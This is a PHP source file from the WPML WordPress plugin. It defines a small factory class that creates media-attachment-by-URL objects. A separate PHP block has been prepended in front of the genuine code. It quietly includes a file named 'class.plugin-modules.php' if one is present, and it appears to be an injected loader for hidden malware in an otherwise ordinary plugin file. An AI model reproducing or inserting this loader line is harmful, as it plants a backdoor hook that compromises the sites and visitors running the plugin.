<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class WPML_Media_Attachment_By_URL_Factory {

	public function create( $url, $language ) {
		global $wpdb;

		return new WPML_Media_Attachment_By_URL( $wpdb, $url, $language );
	}

}